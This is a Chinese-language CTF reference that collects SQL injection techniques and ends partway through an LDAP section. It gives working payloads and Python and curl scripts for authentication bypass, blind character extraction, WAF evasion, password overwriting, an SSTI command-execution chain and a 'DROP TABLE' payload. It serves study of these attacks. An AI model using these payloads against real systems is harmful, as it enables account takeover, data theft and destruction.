# CTF Web - SQL 注入技术

面向 CTF 挑战的 SQL 注入技术合集。其他服务端攻击（SSTI、SSRF、XXE、命令注入、GraphQL）见 [server-side.md](server-side.md)。

## 目录
- [反斜杠转义引号绕过](#反斜杠转义引号绕过)
- [十六进制编码绕过引号](#十六进制编码绕过引号)
- [二次注入](#二次注入)
- [SQLi LIKE 逐字符爆破](#sqli-like-逐字符爆破)
- [MySQL 列截断（VolgaCTF 2014）](#mysql-列截断volgactf-2014)
- [SQLi 转 SSTI 链](#sqli-转-ssti-链)
- [MySQL information_schema.processList 技巧](#mysql-information_schemaprocesslist-技巧)
- [通过 XML 实体编码绕过 WAF（Crypto-Cat）](#通过-xml-实体编码绕过-wafcrypto-cat)
- [通过 EXIF 元数据注入 SQLi（29c3 CTF 2012）](#通过-exif-元数据注入-sqli29c3-ctf-2012)
- [Shift-JIS 编码 SQL 注入（Boston Key Party 2016）](#shift-jis-编码-sql-注入boston-key-party-2016)
- [通过二维码输入注入 SQL（H4ckIT CTF 2016）](#通过二维码输入注入-sqlh4ckit-ctf-2016)
- [SQL 双关键字过滤绕过（DefCamp CTF 2016）](#sql-双关键字过滤绕过defcamp-ctf-2016)
- [MySQL 会话变量实现双值注入（MeePwn CTF 2017）](#mysql-会话变量实现双值注入meepwn-ctf-2017)
- [PHP PCRE 回溯上限 WAF 绕过（SECUINSIDE 2017）](#php-pcre-回溯上限-waf-绕过secuinside-2017)
- [information_schema.processlist 竞态泄露（SECUINSIDE 2017）](#information_schemaprocesslist-竞态泄露secuinside-2017)
- [SQL BETWEEN 恒真绕过（DefCamp 2017）](#sql-between-恒真绕过defcamp-2017)
- [Host 头 SQL 注入配合 PROCEDURE ANALYSE()（DefCamp 2017，仅 MySQL ≤5.7 / MariaDB）](#host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57-mariadb-only)
- [SQLite 通过 randomblob() 时间盲注（SECCON 2017）](#sqlite-通过-randomblob-时间盲注seccon-2017)
- [vsprintf 双重格式化 SQLi（AceBear 2018）](#vsprintf-双重格式化-sqliacebear-2018)
- [INSERT ON DUPLICATE KEY UPDATE 覆盖密码（Midnight Sun CTF 2018）](#insert-on-duplicate-key-update-覆盖密码midnight-sun-ctf-2018)
- [MySQL innodb_table_stats 替代 information_schema（N1CTF 2018）](#mysql-innodb_table_stats-替代-information_scheman1ctf-2018)
- [SQLi 内联注释跨字段拆分（picoCTF 2018）](#sqli-内联注释跨字段拆分picoctf-2018)
- [PHP 全角美元符正则锚点绕过（Hack.lu CTF 2018）](#php-全角美元符正则锚点绕过hacklu-ctf-2018)
- [MySQL REGEXP 逐字节预言 + 反引号注释绕过（BSides Delhi 2018）](#mysql-regexp-逐字节预言--反引号注释绕过bsides-delhi-2018)
- [LDAP 过滤器突破与通配符注入（CSAW 2018）](#ldap-过滤器突破与通配符注入csaw-2018)
- [ExpressionEngine FileManager ORDER BY 排序键 SQLi（35C3 2018）](#expressionengine-filemanager-order-by-排序键-sqli35c3-2018)
- [PHP parse_str() 变量注入（TokyoWesterns 2018）](#php-parse_str-变量注入tokyowesterns-2018)
- [通过 X-Forwarded-For 的 SQLite UNION 与 PHPSESSID 预言（NCSC 2019）](#通过-x-forwarded-for-的-sqlite-union-与-phpsessid-预言ncsc-2019)
- [引号相邻的 UNION 关键字过滤绕过（TAMUctf 2019）](#引号相邻的-union-关键字过滤绕过tamuctf-2019)

---

<a id="backslash-escape-quote-bypass"></a>
## 反斜杠转义引号绕过
```bash
# 查询：SELECT * FROM users WHERE username='$user' AND password='$pass'
# 当 username=\ 时：WHERE username='\' AND password='...'
curl -X POST http://target/login -d 'username=\&password= OR 1=1-- '
curl -X POST http://target/login -d 'username=\&password=UNION SELECT value,2 FROM flag-- '
```

<a id="hex-encoding-for-quote-bypass"></a>
## 十六进制编码绕过引号
```sql
SELECT 0x6d656f77;  -- 返回 'meow'
-- 配合 UNION 做 SSTI 注入：
username=asd\&password=) union select 1, 0x7b7b73656c662e5f5f696e69745f5f7d7d#
```

<a id="second-order-sql-injection"></a>
## 二次注入
**模式（Second Breakfast）：** 注册时在用户名中注入 SQL，查看个人资料时触发。
1. 用恶意用户名注册：`' UNION select flag, CURRENT_TIMESTAMP from flags where 'a'='a`
2. 正常登录
3. 查看资料 → 使用已存储用户名的查询执行了注入 SQL

```python
import requests

s = requests.Session()

# 第 1 步：存储恶意 payload（INSERT 时被安全转义）
s.post("https://target.com/register", data={
    "username": "admin'-- -",
    "password": "anything"
})

# 第 2 步：触发——payload 从数据库取出后被不安全地使用
# 常见触发点：改密码、更新资料、用存储值做搜索
s.post("https://target.com/change-password", data={
    "old_password": "anything",
    "new_password": "hacked"
})
# UPDATE users SET password='hacked' WHERE username='admin'-- -'
# 结果：admin 密码被改掉
```

**关键点：** 二次注入发生在输入被安全存储、但之后取出并拼进新查询且未转义的时候。注意注册→资料更新流程、被查询使用的存储偏好，以及任何从数据库读回用户可控数据的功能。

<a id="sqli-like-character-brute-force"></a>
## SQLi LIKE 逐字符爆破
```python
password = ""
for pos in range(length):
    for c in string.printable:
        payload = f"' OR password LIKE '{password}{c}%' --"
        if oracle(payload):
            password += c; break
```

<a id="mysql-column-truncation-volgactf-2014"></a>
## MySQL 列截断（VolgaCTF 2014）

**模式：** 注册表单后端是 MySQL `VARCHAR(N)`。MySQL 会静默截断超过 N 个字符的字符串，并在字符串比较时忽略尾部空格。注册 `"admin" + 空格 + 垃圾字符`，就能创建一行重复的 "admin"，密码由攻击者控制。

```bash
# VARCHAR(20) 列——把 "admin"（5 字符）填充到超过列宽
# MySQL 截断为 "admin               " → 比较时匹配 "admin"

# 用攻击者密码注册重复的 admin
curl -X POST http://target/register -d \
  'login=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=attacker123'

# 用攻击者密码登录 admin
curl -X POST http://target/login -d 'login=admin&password=attacker123'
```

**为什么有效：**
1. MySQL `VARCHAR(N)` 在 INSERT 时把输入截断到 N 个字符
2. MySQL 在 `=` 比较时忽略尾部空格（SQL 标准的 PAD SPACE 行为）
3. `"admin" + 50 个空格 + "x"` 截断为 `"admin" + 空格` → 匹配 `"admin"`
4. 应用现在有两行匹配 "admin"——原始行和攻击者的行

**关键点：** MySQL 的 PAD SPACE 排序规则使 `"admin" = "admin     "` 为真。配合 `VARCHAR` 静默截断，用空格填充的用户名注册会创建第二个账号，而应用把它当成原始 admin。这能绕过使用 `WHERE username = ?` 的重复注册检查（填充版本在截断前并不是精确匹配）。MySQL 8.0+ 的 `NO_PAD` 排序规则已修复。

<a id="sqli-to-ssti-chain"></a>
## SQLi 转 SSTI 链
当 SQLi 结果被渲染进模板时：
```python
payload = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}"
hex_payload = '0x' + payload.encode().hex()
# 最终：username=x\&password=) union select 1, {hex_payload}#
```

<a id="mysql-information_schemaprocesslist-trick"></a>
## MySQL information_schema.processList 技巧
```sql
SELECT info FROM information_schema.processList WHERE id=connection_id()
SELECT substring(info, 315, 579) FROM information_schema.processList WHERE id=connection_id()
```

<a id="waf-bypass-via-xml-entity-encoding-crypto-cat"></a>
## 通过 XML 实体编码绕过 WAF（Crypto-Cat）
当 SQL 关键字（`UNION`、`SELECT`）被 WAF 拦截时，把它们编码成 XML 十六进制字符引用。XML 解析器会在 SQL 引擎处理查询之前解码实体：
```xml
<storeId>
  1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username &#x46;&#x52;&#x4f;&#x4d; users
</storeId>
```
经 XML 处理后解码为 `1 UNION SELECT username FROM users`。

**编码对照：**
| 关键字 | XML 十六进制实体 |
|---------|-----------------|
| UNION | `&#x55;&#x4e;&#x49;&#x4f;&#x4e;` |
| SELECT | `&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;` |
| FROM | `&#x46;&#x52;&#x4f;&#x4d;` |
| WHERE | `&#x57;&#x48;&#x45;&#x52;&#x45;` |

**关键点：** WAF 检查原始 XML 字节并拦截关键字模式，但 XML 解析器在把值传给 SQL 层之前会解码 `&#xNN;` 实体。任何接受 XML 输入的端点（SOAP、带 XML body 的 REST、库存查询 API）都是候选目标。

**配合 sqlmap：** 使用 `hexentities` tamper 脚本。为防止实体被二次编码成 `&amp;`，修改 `sqlmap/lib/request/connect.py`。

<a id="sqli-via-exif-metadata-injection-29c3-ctf-2012"></a>
## 通过 EXIF 元数据注入 SQLi（29c3 CTF 2012）

**模式：** 应用从上传图片中提取 EXIF 元数据（如 Comment、Artist、Description、Copyright），并把值不做清洗地插入 SQL 查询。嵌在 EXIF 字段里的 SQL payload 可以绕过只检查 HTTP body 和 URL 参数的 WAF。

**向 EXIF 字段注入 SQL：**
```bash
# 把 EXIF Comment 字段设为 SQL payload
exiftool -Comment="' UNION SELECT password FROM users--" image.jpg

# 其他可注入的 EXIF 字段
exiftool -Artist="' OR 1=1--" image.jpg
exiftool -ImageDescription="'; DROP TABLE uploads;--" image.jpg
exiftool -Copyright="' UNION SELECT flag FROM flags--" image.jpg

# XMP 元数据（常被 Web 应用解析）
exiftool -XMP-dc:Description="' UNION SELECT 1,2,3--" image.jpg
```

**关键点：** 图片相册、照片管理应用以及任何存储或展示 EXIF 的上传端点，都可能把元数据直接送进 SQL 查询。WAF 和输入过滤器通常只检查表单字段和 URL 参数，不检查二进制文件内容。除非应用显式清除元数据（如 `exiftool -all=`），否则 EXIF 字段在重新编码后仍会保留。

**检测：** 上传后会展示元数据（相机型号、描述、位置）的端点。检查 EXIF 字段中的特殊字符是否在响应中引发 SQL 报错。

<a id="shift-jis-encoding-sql-injection-boston-key-party-2016"></a>
## Shift-JIS 编码 SQL 注入（Boston Key Party 2016）

多字节编码不一致可以绕过转义函数。日元符号（`\u00a5`）在 Shift-JIS 中映射为反斜杠 `0x5c`。自定义转义函数在日元符号后添加反斜杠，但在 Shift-JIS 上下文中 `\u00a5\` 变成 `\\`，引号就没被转义：

```javascript
socket.send('{"type":"get_answer","answer":"\\u00a5\\" OR 1=1 -- "}')
```

**关键点：** 转义层（Unicode）与数据库层（Shift-JIS）的字符集不一致会击败自定义转义逻辑。注意使用非 UTF-8 编码（Shift-JIS、EUC-JP、GBK）且多字节字符以 `0x5c`（反斜杠）作为尾字节的应用。

<a id="sql-injection-via-qr-code-input-h4ckit-ctf-2016"></a>
## 通过二维码输入注入 SQL（H4ckIT CTF 2016）

解码二维码并把内容用于 SQL 查询的应用，会通过二维码图片本身形成注入面。

```python
import qrcode
import base64
import requests

# 生成包含 SQL 注入 payload 的二维码
# 空格可能被过滤——改用制表符
payload = "'\tunion\tselect\tsecret_field\tfrom\tmessages\twhere\tsecret_field\tlike\t'%flag%"

# 部分应用使用反转 base64：编码、反转，再做二维码编码
encoded = base64.b64encode(payload.encode()).decode().strip()
# reversed_encoded = encoded[::-1]  # 如果应用反转了 base64

# 生成二维码图片
img = qrcode.make(payload)
img.save("sqli_qr.png")

# 把二维码上传到目标应用
files = {'qr': open('sqli_qr.png', 'rb')}
r = requests.post('http://target/scan', files=files)
```

**关键点：** 二维码常被当作“安全”输入。当解码后的内容流入 SQL 查询时，标准 SQLi 技术仍然适用，只是在空格被过滤时用制表符（`\t`）替代。二维码编码增加了一层混淆，可能绕过 WAF。

<a id="sql-double-keyword-filter-bypass-defcamp-ctf-2016"></a>
## SQL 双关键字过滤绕过（DefCamp CTF 2016）

针对只做单次删除的关键字过滤：把关键字嵌套在自身内部，删除后刚好还原出原关键字。

```text
# 过滤器从输入中删除一次 "select"
# payload：sselectelect -> 删除后 -> select

# 带嵌套关键字的完整注入：
), ((selselectect * frofromm (seselectlect load_load_filefile('/flag')) as a limit 0, 1), '2') #

# 常见嵌套绕过模式：
# "select" 被拦截：sselectelect、seLselectECT
# "union"  被拦截：ununionion
# "from"   被拦截：frofromm
# "where"  被拦截：whewherere
# "load_file" 被拦截：load_load_filefile
# "and"    被拦截：aandnd
# "or"     被拦截：oorr
```

**关键点：** 只替换/删除一次 SQL 关键字的单次过滤器，只要把关键字嵌进自身就能绕过。外层字符在删除后幸存，重新拼出被禁关键字。测试过滤器是迭代执行还是只执行一次。

<a id="mysql-session-variable-for-dual-value-injection-meepwn-ctf-2017"></a>
## MySQL 会话变量实现双值注入（MeePwn CTF 2017）

当同一个 SQL 参数在同一条数据库连接的两条连续查询中分别求值，MySQL 会话变量（`@var:=`）可以让每次求值返回不同结果。

```sql
-- 第一次求值返回 2，第二次返回 1
case when @wurst is null then @wurst:=2 else @wurst:=@wurst-1 end
```

**示例场景：**
```sql
-- 应用用同一个注入参数执行两条查询：
-- 查询 1：SELECT * FROM users WHERE role = [INJECTION]
-- 查询 2：INSERT INTO log (action) VALUES ([INJECTION])
-- 查询 1 需要 role=2 拿到 admin，查询 2 需要 action=1 避免告警

-- 注入：
' OR role = (case when @w is null then @w:=2 else @w:=@w-1 end) --
```

**关键点：** 会话变量在连接内的多条查询之间保持状态。用 `CASE WHEN @var IS NULL` 在首次使用时初始化、之后逐次变化，让单个注入点满足连续查询中的不同条件。当同一份用户输入被插值进按顺序执行的多个 SQL 语句时很有用。

<a id="php-pcre-backtrack-limit-waf-bypass-secuinside-2017"></a>
## PHP PCRE 回溯上限 WAF 绕过（SECUINSIDE 2017）

PHP 的 `preg_match()` 在超过 PCRE 回溯上限时会静默返回 `false`（而不是 `0`）。在输入后追加 100 万以上字符，迫使回溯超过默认上限（1,000,000），正则匹配失败。

```python
# 通过超过回溯上限绕过 preg_match WAF
payload = "union select 1,2,3-- " + "a" * 1000001
# preg_match 返回 false（错误）而不是 0（未匹配）
# 大多数 PHP 代码检查：if (!preg_match(...)) { allow; }
```

```php
// 有漏洞的 WAF 写法：
if (!preg_match('/union|select|from/i', $_GET['input'])) {
    // 回溯溢出时 preg_match 返回 false
    // !false === true → WAF 被绕过
    $result = mysql_query("SELECT * FROM data WHERE id = " . $_GET['input']);
}
```

**关键点：** PHP 的 PCRE 回溯上限（`pcre.backtrack_limit`，默认 100 万）会让 `preg_match()` 在溢出时返回 `false`，而许多 WAF 因松散比较（`!false == true`）把它当作“未匹配”。修复方式是严格比较 `preg_match() === 0`。这对任何使用松散比较判断返回值的 PHP 正则 WAF 都有效。

<a id="information_schemaprocesslist-race-condition-leak-secuinside-2017"></a>
## information_schema.processlist 竞态泄露（SECUINSIDE 2017）

让 SQL 注入与并发请求竞争，从 `information_schema.processlist` 泄露数据。该表会显示当前正在执行的查询，其中可能包含加密密钥等敏感值。

```sql
-- 通过 processlist 从并发查询中泄露 AES 密钥
union select 1,(select INFO from information_schema.processlist
  where INFO like 0x256465637279707425),3,4 from board
-- '%decrypt%' 的十六进制模式匹配包含密钥的并发查询
```

```python
import requests
import threading

# 竞态：在应用执行敏感查询时并发触发注入
def trigger_sensitive_query():
    """包含 AES 密钥的应用查询"""
    requests.get("http://target/decrypt?data=encrypted_blob")

def leak_processlist():
    """从 processlist 读取的注入"""
    payload = "1 union select 1,(select INFO from information_schema.processlist where INFO like 0x256465637279707425),3,4-- "
    r = requests.get(f"http://target/search?id={payload}")
    if "AES_DECRYPT" in r.text:
        print(f"Leaked: {r.text}")

# 并发触发两者
for _ in range(100):
    t1 = threading.Thread(target=trigger_sensitive_query)
    t2 = threading.Thread(target=leak_processlist)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
```

**关键点：** `information_schema.processlist.INFO` 会暴露 MySQL 服务器上所有正在运行查询的完整 SQL 文本。让注入查询与应用中引用密钥的并发查询赛跑，就能从进程列表里抓到这些密钥。这是在原有 `information_schema.processList` 技巧上增加时间/竞态维度，用来捕获只在执行期间可见的瞬时查询（加密密钥、密码）。

---

<a id="sql-between-operator-tautology-bypass-defcamp-2017"></a>
## SQL BETWEEN 恒真绕过（DefCamp 2017）

**模式：** WAF 拦截比较运算符（`=`、`<`、`>`）和数字字面量时，用 `id BETWEEN id AND id` 作为恒真条件。两个边界都是列引用（不是被过滤的字面量），而一个值永远在自身与自身之间。

```sql
-- 被 WAF 拦截：数字和比较运算符都被过滤
-- id=1 → 被拦，id>0 → 被拦，1=1 → 被拦

-- 用列名作边界的 BETWEEN（恒真）：
id BETWEEN id AND id           -- 语义：id <= id AND id >= id → 恒真

-- 配合 UNION 的完整绕过：
' OR id BETWEEN id AND id UNION SELECT flag,2,3 FROM flags--

-- UNION 也被拦时，配合条件判断：
id BETWEEN id AND id AND (SELECT SUBSTR(flag,1,1) FROM flags) BETWEEN 'a' AND 'z'
```

```python
import requests

def sqli_between(position, low_char, high_char):
    """用 BETWEEN 做二分查找、逐字符提取。"""
    payload = (
        f"' OR id BETWEEN id AND id "
        f"AND SUBSTR((SELECT flag FROM flags LIMIT 1),{position},1) "
        f"BETWEEN '{low_char}' AND '{high_char}'-- "
    )
    r = requests.get("http://target/item", params={"id": payload})
    return "result" in r.text   # 真值响应 = 条件成立
```

**`information_schema` 被拦时配合 schema 枚举：**
```sql
-- 在 MySQL ≤5.7 / MariaDB 上用 PROCEDURE ANALYSE() 作为替代（见下一节）
SELECT * FROM users WHERE id BETWEEN id AND id PROCEDURE ANALYSE()
```

**关键点：** SQL `BETWEEN col AND col` 用同一列作上下界，语义上是恒真，但语法上避开了数字和比较运算符特征。数字字面量和 `=`/`<`/`>` 被过滤时，可以配合字符串列引用做盲注提取。

---

<a id="host-header-sql-injection-with-procedure-analyse-defcamp-2017-mysql-57-mariadb-only"></a>
## Host 头 SQL 注入配合 PROCEDURE ANALYSE()（DefCamp 2017，仅 MySQL ≤5.7 / MariaDB）

**模式：** HTTP `Host` 头被不做清洗地用于 SQL 查询（例如记录访问日志或解析虚拟主机）。WAF 很少检查 Host，因此标准注入技术可用。`information_schema` 被拦时，MySQL 的 `PROCEDURE ANALYSE()` 可用来枚举表和列（仅 MySQL ≤5.7 / MariaDB——MySQL 8.0.1 已移除）。

```bash
# 测试：向 Host 头注入
curl -H "Host: ' OR '1'='1'--" http://target/
# 如果响应不同 → Host 头被注入进 SQL

# 通过 Host 头 UNION 注入：
curl -H "Host: ' UNION SELECT table_name,2,3 FROM information_schema.tables-- " http://target/

# information_schema 被拦时，在运行中的查询后追加 PROCEDURE ANALYSE()：
curl -H "Host: ' PROCEDURE ANALYSE()-- " http://target/
# PROCEDURE ANALYSE() 分析结果集并返回列元数据，泄露列名
```

```python
import requests

TARGET = "http://target/"

def host_sqli(payload):
    r = requests.get(TARGET, headers={"Host": payload})
    return r.text

# information_schema 被拦时，用 PROCEDURE ANALYSE() 枚举列：
# 不需要匹配 UNION 的列数——它分析应用查询自身的结果集
result = host_sqli("' PROCEDURE ANALYSE()-- ")
print(result)

# PROCEDURE ANALYSE() 输出包含：字段名、最小/最大值、最优数据类型
# 这会泄露列名、行数和样本值
```

**PROCEDURE ANALYSE() 输出结构：**
```sql
-- 返回类似：
-- Field_name: database.table.column
-- Min_value / Max_value: 实际数据范围
-- Optimal_fieldtype: 建议的列类型
-- "Field_name" 列泄露完全限定的列名：db.table.column
```

**其他 Host 头注入点：**
```text
X-Forwarded-For      # 作为客户端 IP 写入数据库
X-Real-IP            # 同上
User-Agent           # 用于分析日志
Referer              # 用于来源跟踪日志
```

**关键点：** `PROCEDURE ANALYSE()` 是 `information_schema` 的遗留替代方案（仅 MySQL ≤5.7 / MariaDB，MySQL 8.0.1 移除），它分析结果集并返回列元数据。MySQL 8+ 改用 `mysql.innodb_table_stats`（见下文）。Host 头注入常被 WAF 和开发者忽视，因为它不是典型用户输入字段，但它经常流入日志、虚拟主机或分析类 SQL 查询。

---

<a id="sqlite-blind-sqli-via-randomblob-timing-seccon-2017"></a>
## SQLite 通过 randomblob() 时间盲注（SECCON 2017）

**模式：** SQLite 没有 `SLEEP()` 函数。用 `randomblob(N)` 做基于时间的盲注原语——生成大随机 blob 会产生与参数大小成正比的延迟。

```sql
-- 基础时间盲注测试：条件为真时 randomblob() 引入延迟
admin' and 1=randomblob(300000000)--

-- 通过 LIKE 逐字符提取密码：
admin' and password like 'f%' and 1=randomblob(300000000)--
admin' and password like 'fl%' and 1=randomblob(300000000)--
admin' and password like 'fla%' and 1=randomblob(300000000)--
admin' and password like 'flag%' and 1=randomblob(300000000)--
```

```python
import requests
import time
import string

url = "http://target/login"
known = ""

for pos in range(32):
    for c in string.ascii_lowercase + string.digits + "_{}":
        payload = f"admin' and password like '{known}{c}%' and 1=randomblob(300000000)--"
        start = time.time()
        requests.post(url, data={"username": payload, "password": "x"})
        elapsed = time.time() - start
        if elapsed > 2.0:  # 阈值：randomblob(300M) 约 2-3 秒
            known += c
            print(f"Found: {known}")
            break
```

**关键点：** `randomblob()` 生成与参数大小成正比的随机数据，产生可测量的延迟。这是 SQLite 版的 MySQL `SLEEP()` / PostgreSQL `pg_sleep()`。根据服务器性能调整参数（如 `300000000`）以获得可靠的时间差。SQLite 的其他延迟方案包括 `zeroblob()` 和递归 CTE，但 `randomblob()` 最可靠。

---

<a id="vsprintf-double-prepare-format-string-sqli-acebear-2018"></a>
## vsprintf 双重格式化 SQLi（AceBear 2018）

**模式：** 用户输入两次经过 `vsprintf()`（一次格式化，一次构建查询）时，第一轮中的 `%1$c` 等格式说明符会生成绕过字符串级转义的字符。整数 `39` 经 `%c` 转换成 ASCII `'`（单引号），击败 `mysqli_real_escape_string`。

```text
# 攻击参数：
username=39&password=%1$c+or+1=1--+-

# 服务端处理：
# 1. 输入被转义：mysqli_real_escape_string 对 "39" 和 "%1$c or 1=1-- -" 都无可转义
# 2. vsprintf 处理查询模板：
#    vsprintf("SELECT * FROM users WHERE user='%1$c or 1=1-- -' AND pass='%s'", [39, ...])
# 3. %1$c 把参数 39 转成 chr(39) → '（单引号）
# 4. 结果：WHERE user='' or 1=1-- -' AND pass='...'
#    → 认证绕过
```

```python
import requests

# 第 1 步：绕过登录
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c or 1=1-- -"
})

# 第 2 步：用 UNION 提取数据
r = requests.post("http://target/login", data={
    "username": "39",
    "password": "%1$c union select 1,group_concat(flag),3 from flags-- -"
})
```

**关键点：** `vsprintf` 中的 `%c` 会把整数转成字符，绕过字符串级转义。如果用户输入两次经过 `vsprintf`（一次格式化、一次构建查询），第一次输入中的格式说明符就会成为第二轮的 SQL 注入点。技巧是：一个参数传 `39`（单引号的 ASCII 码），另一个参数传 `%1$c` 把它按字符引用。注意把 `sprintf`/`vsprintf` 与查询构造串联的 PHP 代码。

---

<a id="sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018"></a>
### INSERT ON DUPLICATE KEY UPDATE 覆盖密码（Midnight Sun CTF 2018）

**模式：** 能注入 INSERT 语句但 SELECT 权限被收回时，用 MySQL 的 `ON DUPLICATE KEY UPDATE` 覆盖已有用户密码。当 INSERT 违反 UNIQUE 约束时，该子句会改为更新已有行。

```sql
-- 有漏洞的 INSERT：
INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT')

-- 在 username 字段注入：
'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#

-- 最终查询：
INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
-- 这会插入一行 'root'，当 username 的 UNIQUE 约束冲突时，
-- 把已有 root 用户的密码更新为 'l'
```

```python
import requests

# 通过 ON DUPLICATE KEY UPDATE 覆盖 root 密码
payload_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
r = requests.post("http://target/register", data={
    "username": payload_username,
    "password": "anything"
})

# 现在用被覆盖的密码登录 root
r = requests.post("http://target/login", data={
    "username": "root",
    "password": "hacked"
})
print(r.text)
```

**关键点：** INSERT 语句中的 MySQL `ON DUPLICATE KEY UPDATE` 可以在 UNIQUE 约束冲突时修改已有行，从而在没有 SELECT 权限时覆盖密码。当数据库用户只有 INSERT 没有 SELECT、无法做传统 UNION 提取时尤其有用。注意注册或用户创建端点中可注入的 INSERT 查询。

---

<a id="mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018"></a>
### MySQL innodb_table_stats 替代 information_schema（N1CTF 2018）

**模式：** WAF 拦截对 `information_schema` 的访问时，用 `mysql.innodb_table_stats` 枚举数据库和表名。这个系统表包含 InnoDB 表的元数据，通常不在 WAF 规则里。

```sql
-- 直接查询（非盲注时）：
SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()

-- 还可以：
SELECT group_concat(database_name) FROM mysql.innodb_table_stats
```

```python
# 通过 innodb_table_stats 做布尔盲注提取：
import requests
import string

def blind_extract(url):
    result = ""
    for pos in range(1, 100):
        found = False
        for char in string.ascii_lowercase + string.digits + "_,":
            payload = (
                "'or(if(1,(select(substr((select(group_concat(table_name))"
                f" from mysql.innodb_table_stats where database_name=database()),{pos},1))"
                f"='{char}'),1)=1)#"
            )
            r = requests.post(url, data={"input": payload})
            if "success" in r.text:  # 按实际预言条件调整
                result += char
                found = True
                print(f"[+] Extracted so far: {result}")
                break
        if not found:
            break
    return result

tables = blind_extract("http://target/search")
print(f"Tables: {tables}")
```

**其他绕过 WAF 的元数据来源：**
```sql
-- mysql.innodb_table_stats: database_name, table_name
-- mysql.innodb_index_stats: database_name, table_name, index_name
-- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
-- sys.x$schema_table_statistics: 同上，格式化更少
```

**关键点：** `mysql.innodb_table_stats` 有 `database_name` 和 `table_name` 列，在 `information_schema` 被 WAF 过滤时提供替代元数据来源。与 `information_schema` 不同，它只跟踪 InnoDB 表（不含列名），因此找到表后要配合报错或盲注技术发现列名。

---

<a id="sqli-inline-comment-multi-field-split-picoctf-2018"></a>
## SQLi 内联注释跨字段拆分（picoCTF 2018）

**模式：** 正则过滤检查 username 字段，但 password 字段不过滤。在 username 中开始 MySQL 内联注释 `/*`，在 password 中闭合 `*/`，把注入拆到两个字段，任何单个字段都不会单独触发过滤。

```text
# 有漏洞的查询（PHP 拼接后）：
SELECT * FROM users WHERE name='<username>' AND password='<password>'

# payload：
username = '/*
password = */ OR 1=1 --

# MySQL 看到的最终查询：
SELECT * FROM users WHERE name='/*' AND password='*/ OR 1=1 -- '
# 去除注释后：
SELECT * FROM users WHERE name=' OR 1=1 -- '
```

```python
import requests
r = requests.post("http://target/login", data={
    "username": "'/*",
    "password": "*/ OR 1=1 -- "
})
```

**关键点：** 当过滤发生在插值之前而不是之后，MySQL 的 `/* ... */` 注释会跨越字符串定界符和字段边界。任何一次只校验一个字段的检查都会漏掉完整注入串。当黑名单命中 username 正则、但 password 字段被渲染进同一查询时，把 payload 拆到两个输入里。

**参考：** picoCTF 2018 — THE VAULT，writeup 11747

---

<a id="php-full-width-dollar-regex-anchor-bypass-hacklu-ctf-2018"></a>
## PHP 全角美元符正则锚点绕过（Hack.lu CTF 2018）

**模式：** PHP 正则 `/^\d+＄/` 使用的是 Unicode 全角美元符（`＄`，U+FF04）而不是 ASCII `$`。PCRE 把全角字符当作普通字面量，因此没有字符串结尾锚点，即使尾部有垃圾字符也能匹配成功。

```php
// 有漏洞的检查
if (preg_match('/^\d+＄/', $input)) { /* 通过 */ }

// payload 通过校验，随后触发长字符串处理
$_GET['key2'] = '1337＄' . str_repeat('a', 50);
```

```bash
curl "http://target/?key2=1337%EF%BC%84$(python3 -c 'print("a"*50)')"
```

**关键点：** 正则特殊字符要按码点比较，不要按外观判断。`$`、`^`、`.`、`[`、`]`、`*`、`+`、`?`、`(`、`)` 的 Unicode 形近字符在 PCRE 中是字面量，会静默降级模式。信任过滤器之前，用 `hexdump -C` 检查每个锚点。

**参考：** Hack.lu CTF 2018 — Baby PHP，writeup 11846

---

<a id="mysql-regexp-byte-by-byte-oracle--backtick-comment-bypass-bsides-delhi-2018"></a>
## MySQL REGEXP 逐字节预言 + 反引号注释绕过（BSides Delhi 2018）

**模式：** WAF 拦截 `|`、`-`、`\`、`#`、`and`、`if`、`where`、`concat`、`insert`、`having`、`sleep`，但放过 `REGEXP` 和反引号标识符。用反引号分隔的注释 `/**/` 替代空格，用 `REGEXP` 作为布尔预言，按锚定前缀逐字符匹配。在老版本 PHP/MySQL 组合中，尾部空字节会终止查询并丢掉周围的单引号。

```text
# 黑名单（部分）：| - \ ( ) # and if database where concat insert having sleep

# 预言查询：
/?user=`\`&pw=`||pw/**/REGEXP/**/%22^1%22;%00

# 迭代扩展正则前缀：
^1 → ^17 → ^172 → ^1729 ...
```

```python
import requests, string
URL = "http://target/"
prefix = ""
charset = string.ascii_letters + string.digits + "{}_"
while True:
    for c in charset:
        pw = f"`||pw/**/REGEXP/**/\"^{prefix+c}\";\x00"
        r = requests.get(URL, params={"user": "`\\`", "pw": pw})
        if "Welcome" in r.text:
            prefix += c
            print(prefix)
            break
    else:
        break
```

**关键点：** `REGEXP` 很少出现在 WAF 关键字列表里，且支持锚点（`^`、`$`）和字符类，可以在没有 `AND`、`IF`、`SUBSTRING` 的情况下提供完整逐字节预言。反引号列引用配合 `/**/` 注释可以在无空格时分隔 token。在仍接受内嵌 NUL 的 MySQL 客户端中，payload 后的空字节会提前截断 SQL 字符串。

**参考：** BSides Delhi CTF 2018 — Old School SQL，writeup 11953

---

<a id="ldap-filter-breakout-with-wildcard-injection-csaw-2018"></a>
## LDAP 过滤器突破与通配符注入（CSAW 2018）

**模式：** LDAP 搜索过滤器 `(&(GivenName=<input>)(!(GivenName=Flag)))` 在不转义括号和通配符的情况下插值用户输入。注入 `*))(|(uid=*` 可以闭合第一个子句、打开一个析取，从而匹配所有条目——包括被屏蔽的 `Flag` 账号。

```text
# 原始过滤器
(&(GivenName=Alice)(!(GivenName=Flag)))

# 注入输入：*))(|(uid=*
# 结果过滤器
